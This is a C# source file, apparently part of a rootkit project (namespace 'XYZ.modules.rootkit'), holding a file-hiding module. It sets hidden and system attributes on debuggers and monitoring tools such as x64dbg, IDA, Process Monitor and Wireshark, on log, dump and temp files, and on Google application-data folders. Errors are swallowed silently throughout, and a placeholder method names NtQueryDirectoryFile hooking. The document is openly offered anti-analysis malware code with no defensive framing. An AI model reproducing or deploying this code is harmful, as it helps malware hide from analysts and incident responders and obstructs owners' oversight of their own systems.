using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Collections.Generic;

namespace XYZ.modules.rootkit
{
    public class FileHidingModule
    {
        // DLL imports for file system manipulation
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetFileAttributes(string lpFileName, uint dwFileAttributes);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint GetFileAttributes(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetFileAttributesEx(string lpFileName, int fInfoLevelId, out WIN32_FILE_ATTRIBUTE_DATA fileData);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr FindFirstFile(string lpFileName, out WIN32_FIND_DATA lpFindFileData);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FindNextFile(IntPtr hFindFile, out WIN32_FIND_DATA lpFindFileData);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FindClose(IntPtr hFindFile);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtQueryDirectoryFile(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, IntPtr IoStatusBlock, IntPtr FileInformation, uint Length, uint FileInformationClass, bool ReturnSingleEntry, IntPtr FileName, bool RestartScan);

        // File attribute constants
        private const uint FILE_ATTRIBUTE_HIDDEN = 0x2;
        private const uint FILE_ATTRIBUTE_SYSTEM = 0x4;
        private const uint FILE_ATTRIBUTE_DIRECTORY = 0x10;
        private const uint INVALID_FILE_ATTRIBUTES = 0xFFFFFFFF;

        // Structures
        [StructLayout(LayoutKind.Sequential)]
        private struct WIN32_FILE_ATTRIBUTE_DATA
        {
            public uint dwFileAttributes;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftCreationTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftLastAccessTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftLastWriteTime;
            public uint nFileSizeHigh;
            public uint nFileSizeLow;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct WIN32_FIND_DATA
        {
            public uint dwFileAttributes;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftCreationTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftLastAccessTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftLastWriteTime;
            public uint nFileSizeHigh;
            public uint nFileSizeLow;
            public uint dwReserved0;
            public uint dwReserved1;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string cFileName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
            public string cAlternateFileName;
        }

        private List<string> hiddenFiles;
        private List<string> hiddenDirectories;
        private List<string> hiddenPatterns;

        public FileHidingModule()
        {
            hiddenFiles = new List<string>();
            hiddenDirectories = new List<string>();
            hiddenPatterns = new List<string>();
        }

        public void HideFiles()
        {
            try
            {
                // Hide common analysis tools and their artifacts
                HideFile("ollydbg.exe");
                HideFile("x32dbg.exe");
                HideFile("x64dbg.exe");
                HideFile("ida.exe");
                HideFile("ida64.exe");
                HideFile("windbg.exe");
                HideFile("procexp.exe");
                HideFile("procmon.exe");
                HideFile("tcpview.exe");
                HideFile("autoruns.exe");
                HideFile("wireshark.exe");
                HideFile("sysinternalsuite.zip");
                
                // Hide common log and dump files
                HideFilePattern("*.log");
                HideFilePattern("*.dmp");
                HideFilePattern("*.tmp");
                HideFilePattern("*.bak");
                
                // Comment out hiding our own files to prevent instability
                // HideFile("windowsService.exe");
                HideDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Google"));
                HideDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google"));
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void HideFile(string filePath)
        {
            try
            {
                if (File.Exists(filePath))
                {
                    // Set hidden and system attributes
                    SetFileAttributes(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                    if (!hiddenFiles.Contains(filePath))
                    {
                        hiddenFiles.Add(filePath);
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void HideDirectory(string directoryPath)
        {
            try
            {
                if (Directory.Exists(directoryPath))
                {
                    // Set hidden and system attributes
                    SetFileAttributes(directoryPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DIRECTORY);
                    if (!hiddenDirectories.Contains(directoryPath))
                    {
                        hiddenDirectories.Add(directoryPath);
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void HideFilePattern(string pattern)
        {
            try
            {
                if (!hiddenPatterns.Contains(pattern))
                {
                    hiddenPatterns.Add(pattern);
                }
                
                string directory = Path.GetDirectoryName(pattern);
                if (string.IsNullOrEmpty(directory))
                {
                    directory = ".";
                }
                
                string fileNamePattern = Path.GetFileName(pattern);
                if (string.IsNullOrEmpty(fileNamePattern))
                {
                    fileNamePattern = "*";
                }
                
                // Hide all files matching a pattern
                string[] files = Directory.GetFiles(directory, fileNamePattern);
                foreach (string file in files)
                {
                    HideFile(file);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void UnhideFile(string filePath)
        {
            try
            {
                if (File.Exists(filePath) && hiddenFiles.Contains(filePath))
                {
                    // Remove hidden and system attributes
                    uint currentAttributes = GetFileAttributesInternal(filePath);
                    SetFileAttributes(filePath, currentAttributes & ~(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM));
                    hiddenFiles.Remove(filePath);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private uint GetFileAttributesInternal(string lpFileName)
        {
            return GetFileAttributes(lpFileName);
        }

        // Method to check if a file is hidden
        public bool IsFileHidden(string filePath)
        {
            try
            {
                return hiddenFiles.Contains(filePath);
            }
            catch (Exception)
            {
                return false;
            }
        }

        // Method to check if a directory is hidden
        public bool IsDirectoryHidden(string directoryPath)
        {
            try
            {
                return hiddenDirectories.Contains(directoryPath);
            }
            catch (Exception)
            {
                return false;
            }
        }

        // Method to get all hidden files
        public List<string> GetHiddenFiles()
        {
            return new List<string>(hiddenFiles);
        }

        // Method to get all hidden directories
        public List<string> GetHiddenDirectories()
        {
            return new List<string>(hiddenDirectories);
        }

        // Method to check if a file matches any hidden pattern
        public bool IsFilePatternHidden(string fileName)
        {
            try
            {
                foreach (string pattern in hiddenPatterns)
                {
                    // Simple pattern matching (in a real implementation, you would use more sophisticated matching)
                    if (pattern.Contains("*") || pattern.Contains("?"))
                    {
                        // For demonstration, we'll do simple matching
                        string patternWithoutWildcard = pattern.Replace("*", "").Replace("?", "");
                        if (fileName.Contains(patternWithoutWildcard))
                        {
                            return true;
                        }
                    }
                    else if (fileName.Equals(pattern, StringComparison.OrdinalIgnoreCase))
                    {
                        return true;
                    }
                }
                return false;
            }
            catch (Exception)
            {
                return false;
            }
        }

        // Method to add a file to hide
        public void AddFileToHide(string filePath)
        {
            try
            {
                if (!hiddenFiles.Contains(filePath))
                {
                    hiddenFiles.Add(filePath);
                    HideFile(filePath); // Apply hiding immediately
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to add a directory to hide
        public void AddDirectoryToHide(string directoryPath)
        {
            try
            {
                if (!hiddenDirectories.Contains(directoryPath))
                {
                    hiddenDirectories.Add(directoryPath);
                    HideDirectory(directoryPath); // Apply hiding immediately
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to add a pattern to hide
        public void AddPatternToHide(string pattern)
        {
            try
            {
                if (!hiddenPatterns.Contains(pattern))
                {
                    hiddenPatterns.Add(pattern);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to remove a file from hiding
        public void RemoveFileFromHiding(string filePath)
        {
            try
            {
                if (hiddenFiles.Contains(filePath))
                {
                    hiddenFiles.Remove(filePath);
                    UnhideFile(filePath); // Remove hiding immediately
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to remove a directory from hiding
        public void RemoveDirectoryFromHiding(string directoryPath)
        {
            try
            {
                if (hiddenDirectories.Contains(directoryPath))
                {
                    hiddenDirectories.Remove(directoryPath);
                    // Note: We don't unhide the directory here as that might not be desired
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to remove a pattern from hiding
        public void RemovePatternFromHiding(string pattern)
        {
            try
            {
                hiddenPatterns.Remove(pattern);
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to hide files using NtQueryDirectoryFile hooking
        public void HideFilesUsingNtQuery()
        {
            try
            {
                // This would typically involve hooking NtQueryDirectoryFile
                // and filtering out files that match our hidden patterns
                // For demonstration, we'll just mark that this method was called
            }
            catch (Exception)
            {
                // Silent fail
            }
        }
    }
}